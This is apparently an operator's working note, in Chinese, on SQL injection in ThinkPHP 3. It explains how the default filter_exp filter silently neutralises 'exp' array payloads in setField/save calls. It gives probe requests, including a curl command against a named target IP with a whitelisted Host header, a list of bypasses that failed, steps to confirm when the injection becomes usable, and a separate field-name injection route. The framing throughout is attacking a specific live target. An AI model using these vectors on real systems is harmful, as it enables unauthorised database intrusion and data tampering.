# ThinkPHP 3：`VAR_FILTERS=filter_exp` 使 `exp` 数组注入全线失效（且静默无痕）

## 1. 机制（为什么注入会「凭空消失」）

TP3 里最经典的数组注入是喂一个 `['exp','<原始 SQL>']` 给写操作：

```php
// 业务代码（举实例）
M('payorder')->where(array('ordernum'=>$_POST['ordernum']))->setField(array('money'=>$_POST['money'],'unq'=>$aa));
```

```php
// DbMysql::parseSet()  —— 只有 $val[0] 严格等于 'exp' 才走原始拼接
foreach ($data as $key=>$val){
    if(is_array($val) && 'exp' == $val[0]){
        $set[] = $this->parseKey($key).'='.$val[1];        // ← 这里完全不过滤，是注入点
    }elseif(is_scalar($val) || is_null($val)){
        $set[] = $this->parseKey($key).'='.$this->parseValue($val);
    }
    // ★ 没有 else —— 是数组但 $val[0] != 'exp' 时，这个字段被【静默丢弃】
}
```

**但 TP3 在 `App::init()` 里对入参做了全局预处理**：

```php
// Core/Lib/Core/Think.class.php  App::init()
if(C('VAR_FILTERS')) {
    $filters = explode(',', C('VAR_FILTERS'));
    foreach($filters as $filter){
        array_walk_recursive($_POST, $filter);   // ★ 递归到嵌套数组的叶子
        array_walk_recursive($_GET,  $filter);
    }
}
```
```php
// Core/Common/functions.php
function filter_exp(&$value){
    if (in_array(strtolower($value), array('exp','or'))){
        $value .= ' ';                            // ★ 'exp' → 'exp '（尾部加一个空格）
    }
}
```

⇒ `$_POST['money'][0]` 变成 `'exp '`（带空格）⇒ `'exp' == 'exp '` 为**假** ⇒ 走不进原始拼接分支，又因为 `is_scalar()` 对数组为假 ⇒ **整个字段被丢掉**。最终 SQL 里只剩下其它字段（如 `unq='…'`），**语句合法、返回成功、HTTP 层完全看不出被拦**。

**这是框架作者有意加的防注入**（`convention.php` 默认 `'VAR_FILTERS' => 'filter_exp'`），不是目标方额外加固。

## 2. 判定向量（★ 用一个「语法错」向量，最可靠）

选一个已知会把 `$_POST` 直接塞进 `setField/save/add` 的写接口，用**一个必然 0 行命中的 WHERE 值**（避免改数据），跑这 4 组：

| # | 请求 | exp 生效（有注入） | exp 失效（被丢字段） |
|---|---|---|---|
| C | `money=1`（标量基线） | 正常 JSON | 正常 JSON |
| K1 | `money[0]=exp&money[1]=1,` ← **尾部多余逗号** | **1064 语法错 → ThinkPHP 错误页/非 JSON** | 正常 JSON（字段被丢） |
| K2 | `money[0]=exp&money[1]=1` | 正常 JSON | 正常 JSON |
| K3 | `money[0]=exp`（不给 [1]） | `Undefined offset` 仍可能拼接 | 正常 JSON |

```bash
# 实测（靶标 203.0.113.91，PHP 5.6.40 + TP 3.1.3）
curl -k -s --noproxy '*' -H "Host: <白名单Host>" -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'ordernum=zz_nosuch_order_999&money%5B0%5D=exp&money%5B1%5D=1,' \
  "https://TARGET/example.com?g=Home&m=Pay&a=orderqr"
# → {"ordernum":"zz_nosuch_order_999","ok":1}   与标量基线逐字节相同 ⇒ exp 失效
```

**辅助向量**：`money[0]=exp&money[1]=1,`不存在的列`=1` → 若 exp 生效会 1054 未知列报错；实测**无报错**，同结论。

**无效的绕过（全部实测过，别再试）**：
- 大写 `EXP` / 混合大小写 → `filter_exp` 用 `strtolower()` 判断，同样被加空格
- 值前后加空格 `' exp '` → 被当成普通字符串，走 `parseValue` 转义
- 用键名绕：`money[exp]=1,` → `$val[0]` 不存在，直接丢字段
- 只给 `money[0]` 不给 `money[1]` → 同样丢
- 换接口（art_status 的 `type`、login 的 `name`/`pwd`）→ 同一套过滤器，同样失效

## 3. 什么时候仍然可用（别把结论扩大化）
**只要目标 `App/Conf/config.php` 里 `'VAR_FILTERS'` 为空/未设置**（TP3 `convention.php` 里是 `filter_exp`，但业务可以直接覆盖），`exp` 数组注入就恢复可用。
⇒ **判定顺序**：先看目标能否读出 `App/Runtime/~runtime.php`（编译后的合并配置，里面会回显最终生效的 `var_filters`），读不到就跑上面第 2 节的 K1 向量实测。**不要凭"这是 TP3 所以能 exp 注入"直接开工。**

## 4. 同族注意点（TP3 参数过滤的三个层次，排查时别漏）
1. `VAR_FILTERS`（默认 `filter_exp`）→ 只动 `exp`/`or`
2. `DEFAULT_FILTER`（这套 CMS 是 `htmlspecialchars`）→ 只作用于 `I()`/`$this->_post()` 这类**带 filter 的取值**，不影响 `$_POST` 直取；且**不碰反引号与空格** ⇒ 字段名注入（`setInc($_POST['type'])`）不会被它拦
3. `REQUEST_VARS_FILTER` → 若为真才会对 `$_GET/$_POST/$_REQUEST` 套 `think_filter`
⇒ 所以「字段名注入（`parseKey` 对含反引号/空格的 key 原样透传）」与「exp 数组注入」是**两条独立的路**，一条死不代表另一条死，必须分别实测。
